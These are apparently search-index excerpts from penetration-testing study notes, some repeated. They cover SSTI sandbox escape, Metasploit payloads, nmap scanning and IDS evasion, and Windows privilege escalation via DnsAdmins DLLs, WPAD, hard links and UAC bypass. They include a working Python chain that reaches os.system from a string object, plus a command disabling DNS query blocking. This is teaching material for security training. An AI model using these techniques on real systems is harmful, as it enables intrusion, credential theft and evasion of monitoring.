divmod>, ' eval ': <built-in function eval>, ' exec ': <built-in function exec>, ' format ': <built-in function format>, ' getattr ': <built-in function getattr>, ' globals ': <built-in function globals>, < SNIP > >>> z = y () . _module . __builtins__ >>> for i in z : ... if i . find ( 'import' ) >- 1 : ... print ( i , z [ i ]) ... __import__ < built - in function __import__ > It seems we have reached the import function by walking the hierarchy. This means we can load os and use the system function to execute code all coming from a string object: >>> '' . __class__ . __mro__ [ 1 ] . __subclasses__ () [ 215 ]() . _module . __builtins__ [ '__import__' ]( 'os' ) . system ( 'echo RCE from a string object' ) RCE from a string object 0 Returning to our vulnerable web application, let's see how we can repeat the same process and develop an RCE payload. Remember that the below payloads can be submitted to the application via the browser as is or via cURL after being URL encoded.

Then use the dir() command to show all methods and attributes from the object. >>> import flask >>> s = 'HTB' >>> type ( s ) < class ' str '> >>> s . __class__ < class ' str '> >>> dir ( s ) [ '__add__' , '__class__' , '__contains__' , '__delattr__' , '__dir__' , '__doc__' , '__eq__' , '__format__' , '__ge__' , '__getattribute__' , '__getitem__' , '__getnewargs__' , '__gt__' , '__hash__' , '__init__' , '__init_subclass__' , '__iter__' , '__le__' , '__len__' , '__lt__' , '__mod__' , '__mul__' , '__ne__' , '__new__' , '__reduce__' , '__reduce_ex__' , '__repr__' , '__rmod__' , '__rmul__' , '__setattr__' , '__sizeof__' , '__str__' , '__subclasshook__' , 'capitalize' , 'casefold' , 'center' , 'count' , 'encode' , 'endswith' , 'expandtabs' , 'find' , 'format' , 'format_map' , 'index' , 'isalnum' , 'isalpha' , 'isascii' , 'isdecimal' , 'isdigit' , 'isidentifier' , 'islower' , 'isnumeric' , 'isprintable' , 'isspace' , 'istitle' , 'isupper' , 'join' , 'ljust' , 'lower' , 'lstrip' , 'maketrans' , 'partition' , 'replace' , 'rfind' , 'rindex' , 'rjust' , 'rpartition' , 'rsplit' , 'rstrip' , 'split' , 'splitlines' , 'startswith' , 'strip' , 'swapcase' , 'title' , 'translate' , 'upper' , 'zfill' ] The next step is to understand Python's hierarchy. Using __mro__ or mro() , we can go back up to three inherited objects in the Python environment. Let's practice this as follows. >>> s . __class__ . __class__ < class ' type '> >>> s . __class__ . __base__ < class ' object '> >>> s . __class__ . __base__ . __subclasses__ () [ < class ' type '>, <class ' weakref '>, <class ' weakcallableproxy '>, <class ' weakproxy '>, <class ' int '>, <class ' bytearray '>, <class ' bytes '>, <class ' list '>, <class ' NoneType '>, <class ' NotImplementedType '>, <class ' traceback '>, <class ' super '>, <class ' range '>, <class ' dict '>, <class ' dict_keys '>, <class ' dict_values '>, <class ' dict_items '>, <class ' dict_reversekeyiterator '>, <class ' dict_reversevalueiterator '>, <class ' dict_reverseitemiterator '>, <class ' odict_iterator '>, <class ' set '>, <class ' str '>, <class ' slice '>, <class ' staticmethod '>, <class ' complex '>, <class ' float '>, <class ' frozenset '>, <class ' property '>, <class ' managedbuffer '>, <class ' memoryview '>, <class ' tuple '>, <class ' enumerate '>, <class ' reversed '>, <class ' stderrprinter '>, <class ' code '>, <class ' frame '>, <class ' builtin_function_or_method '>, <class ' method '>, < SNIP > >>> s . __class__ . mro ()[ 1 ] . __subclasses__ () [ < class ' type '>, <class ' weakref '>, <class ' weakcallableproxy '>, <class ' weakproxy '>, <class ' int '>, <class ' bytearray '>, <class ' bytes '>, <class ' list '>, <class ' NoneType '>, <class ' NotImplementedType '>, <class ' traceback '>, <class ' super '>, <class ' range '>, <class ' dict '>, <class ' dict_keys '>, <class ' dict_values '>, <class ' dict_items '>, <class ' dict_reversekeyiterator '>, <class ' dict_reversevalueiterator '>, <class ' dict_reverseitemiterator '>, <class ' odict_iterator '>, <class ' set '>, <class ' str '>, <class ' slice '>, <class ' staticmethod '>, <class ' complex '>, <class ' float '>, <class ' frozenset '>, <class ' property '>, <class ' managedbuffer '>, <class ' memoryview '>, <class ' tuple '>, <class ' enumerate '>, <class ' reversed '>, <class ' stderrprinter '>, <class ' code '>, <class ' frame '>, <class ' builtin_function_or_method '>, <class ' method '>, < SNIP > Let us look for useful classes that can facilitate remote code execution. >>> x = s . __class__ . mro ()[ 1 ] . __subclasses__ () >>> for i in range ( len ( x )): print ( i , x [ i ] . __name__ ) ... 0 type 1 weakref 2 weakcallableproxy 3 weakproxy 4 int 5 bytearray 6 bytes 7 list 8 NoneType < SNIP > >>> def searchfunc ( name ): ... x = s . __class__ . mro ()[ 1 ] . __subclasses__ () ... for i in range ( len ( x )): ... fn = x [ i ] . __name__ ... if fn . find ( name ) > - 1 : ... print ( i , fn ) ... >>> searchfunc ( 'warning' ) 215 catch_warnings Why are we searching for warning you may ask. We chose this class because it imports Python's sys module , and from sys , the os module can be reached. More precisely, os modules are all from warnings.catch_ . We have seen that catch_warnings is present without importing any additional module to our Python console. Let's enumerate the builtins from this class: >>> y = x [ 215 ] >>> y < class ' warnings . catch_warnings '> >>> y () . _module . __builtins__ { '__name__' : 'builtins' , '__doc__' : \"Built-in functions, exceptions, and other objects. \\n\\n Noteworthy: None is the `nil' object; Ellipsis represents `...' in slices.\" , '__package__' : '' , '__loader__' : < class ' _frozen_importlib .

This means we can load os and use the system function to execute code all coming from a string object: >>> '' . __class__ . __mro__ [ 1 ] . __subclasses__ () [ 215 ]() . _module . __builtins__ [ '__import__' ]( 'os' ) . system ( 'echo RCE from a string object' ) RCE from a string object 0 Returning to our vulnerable web application, let's see how we can repeat the same process and develop an RCE payload. Remember that the below payloads can be submitted to the application via the browser as is or via cURL after being URL encoded.

The diagram below from PortsSwigger can help us identify if we are dealing with an SSTI vulnerability and also identify the underlying template engine. In addition to the above diagram, we can try the following approaches to recognize the technology we are dealing with: Check verbose errors for technology names. Sometimes just copying the error in Google search can provide us with a straight answer regarding the underlying technology used Check for extensions. For example, .jsp extensions are associated with Java. When dealing with Java, we may be facing an expression language/OGNL injection vulnerability instead of traditional SSTI Send expressions with unclosed curly brackets to see if verbose errors are generated.

We can think of it like we are \"setting the stage\" for something even more useful. Take for example this payload linux/x86/shell/reverse_tcp . When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload. Stageless payloads do not have a stage. Take for example this payload linux/zarch/meterpreter_reverse_tcp . Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering.

DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use. Payload Types to consider DLLs A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls. Batch Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of .bat . We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port. VBS VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code. MSI .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell. Powershell Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process. Payload Generation \u00b6 Resource Description MSFVenom & Metasploit-Framework Source MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. Payloads All The Things Source Here, you can find many different resources and cheat sheets for payload generation and general methodology. Mythic C2 Framework Source The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. Nishang Soucre Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester. Darkarmour Source Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts. Payload Transfer and Execution \u00b6 Impacket : Impacket is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with psexec , smbclient , wmi , Kerberos, and the ability to stand up an SMB server. Payloads All The Things : is a great resource to find quick oneliners to help transfer files across hosts expediently. SMB : SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links. Remote execution via MSF : Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically. Other Protocols : When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use. Example Compromise \u00b6 Enumerate the Host To start this time, we will utilize an Nmap scan. The enumeration portion of any exploit chain is arguably the most critical piece of the puzzle. Understanding the target and what makes it tick will raise your chances of gaining a shell. hrmns@htb[/htb]$ nmap -v -A 10 .129.201.97 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT NSE: Loaded 153 scripts for scanning.

DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use. Payload Types to consider DLLs A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls. Batch Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of .bat . We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port. VBS VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code. MSI .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell. Powershell Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.","title":"Bats, DLLs, &amp; MSI Files"},{"location":"shells_payloads/windows_shells/#payload-generation","text":"Resource Description MSFVenom & Metasploit-Framework Source MSF is an extremely versatile tool for any pentester's toolkit.

It is designed to scan networks and identify which hosts are available on the network using raw packets, and services and applications, including the name and version, where possible. It can also identify the operating systems and versions of these hosts. Besides other features, Nmap also offers scanning capabilities that can determine if packet filters, firewalls, or intrusion detection systems (IDS) are configured as needed. Scanning Options \u00b6 Nmap Option Description 10.10.10.0/24 Target network range. -sn Disables port scanning. -Pn Disables ICMP Echo Requests -n Disables DNS Resolution. -PE Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace Shows all packets sent and received. --reason Displays the reason for a specific result. --disable-arp-ping Disables ARP Ping Requests. --top-ports=<num> Scans the specified top ports that have been defined as most frequent. -p- Scan all ports. -p22-110 Scan all ports between 22 and 110. -p22,25 Scans only the specified ports 22 and 25. -F Scans top 100 ports. -sS Performs an TCP SYN-Scan. -sA Performs an TCP ACK-Scan. -sU Performs an UDP Scan. -sV Scans the discovered services for their versions. -sC Perform a Script Scan with scripts that are categorized as \"default\". --script <script> Performs a Script Scan by using the specified scripts. -O Performs an OS Detection Scan to determine the OS of the target. -A Performs OS Detection, Service Detection, and traceroute scans. -D RND:5 Sets the number of random Decoys that will be used to scan the target. -e Specifies the network interface that is used for the scan. -S 10.10.10.200 Specifies the source IP address for the scan. -g Specifies the source port for the scan. --dns-server <ns> DNS resolution is performed by using a specified name server. Output Options \u00b6 Nmap Option Description -oA filename Stores the results in all available formats starting with the name of \"filename\". -oN filename Stores the results in normal format with the name \"filename\". -oG filename Stores the results in \"grepable\" format with the name of \"filename\". -oX filename Stores the results in XML format with the name of \"filename\". Performance Options \u00b6 Nmap Option Description --max-retries <num> Sets the number of retries for scans of specific ports. --stats-every=5s Displays scan's status every 5 seconds. -v/-vv Displays verbose output during the scan. --initial-rtt-timeout 50ms Sets the specified time value as initial RTT timeout. --max-rtt-timeout 100ms Sets the specified time value as maximum RTT timeout. --min-rate 300 Sets the number of packets that will be sent simultaneously. -T <0-5> Specifies the specific timing template. Detect IDS/IPS \u00b6 Unlike firewalls and their rules, the detection of IDS/IPS systems is much more difficult because these are passive traffic monitoring systems. IDS systems examine all connections between hosts. If the IDS finds packets containing the defined contents or specifications, the administrator is notified and takes appropriate action in the worst case. IDS systems alone are usually there to help administrators detect potential attacks on their network. They can then decide how to handle such connections. We can trigger certain security measures from an administrator, for example, by aggressively scanning a single port and its service. Based on whether specific security measures are taken, we can detect if the network has some monitoring applications or not. One method to determine whether such IPS system is present in the target network is to scan from a single host ( VPS ). If at any time this host is blocked and has no access to the target network, we know that the administrator has taken some security measures. Accordingly, we can continue our penetration test with another VPS . Consequently, we know that we need to be quieter with our scans and, in the best case, disguise all interactions with the target network and its services. Decoys \u00b6 There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method ( -D ) is the right choice.

IDS systems examine all connections between hosts. If the IDS finds packets containing the defined contents or specifications, the administrator is notified and takes appropriate action in the worst case. IDS systems alone are usually there to help administrators detect potential attacks on their network. They can then decide how to handle such connections. We can trigger certain security measures from an administrator, for example, by aggressively scanning a single port and its service. Based on whether specific security measures are taken, we can detect if the network has some monitoring applications or not. One method to determine whether such IPS system is present in the target network is to scan from a single host ( VPS ). If at any time this host is blocked and has no access to the target network, we know that the administrator has taken some security measures. Accordingly, we can continue our penetration test with another VPS . Consequently, we know that we need to be quieter with our scans and, in the best case, disguise all interactions with the target network and its services.","title":"Detect IDS/IPS"},{"location":"tools/nmap/#decoys","text":"There are cases in which administrators block specific subnets from different regions in principle.

The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as NT AUTHORITY\\SYSTEM , so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. As detailed in this excellent post , the following attack can be performed when DNS is run on a Domain Controller DNS management is performed over RPC ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\DNS\\Parameters\\ServerLevelPluginDll registry key is populated When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access) An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

We must specify the full path to our custom DLL or the attack will not work properly. With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do. First, we need our user's SID.

Cleaning Up These steps must be taken from an elevated console with a local or domain admin account. The first step is confirming that the ServerLevelPluginDll registry key exists.

Membership in this group gives us the rights to disable global query block security , which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack. Disabling the Global Query Block List C:\\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local Next, we add a WPAD record pointing to our attack machine.

They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain. It is also well documented on this blog , that upon deleting a virtual machine, vmms.exe attempts to restore the original file permissions on the corresponding .vhdx file and does so as NT AUTHORITY\\SYSTEM , without impersonating the user. We can delete the .vhdx file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to. If the operating system is vulnerable to CVE-2018-0952 or CVE-2019-0841 , we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users. An example of this is Firefox, which installs the Mozilla Maintenance Service . We can update this exploit (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below: C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe After running the PowerShell script, we should have full control of this file and can take ownership of it.

The UACME project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. Let's use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary SystemPropertiesAdvanced.exe . There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt. The 32-bit version of SystemPropertiesAdvanced.exe attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality. When attempting to locate a DLL, Windows will use the following search order: The directory from which the application loaded. The system directory C:\\Windows\\System32 for 64-bit systems. The 16-bit system directory C:\\Windows\\System (not supported on 64-bit systems) The Windows directory. Any directories that are listed in the PATH environment variable. Reviewing Path Variable.

A slight modification in one place may introduce a flaw elsewhere. We need to understand how permissions work in Windows and the various ways that misconfigurations can be leveraged to escalate privileges. Regardless of the environment, we should always check for weak permissions and be able to do it both with the help of tools and manually in case we are in a situation where we don't have our tools readily available. We can use SharpUp from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
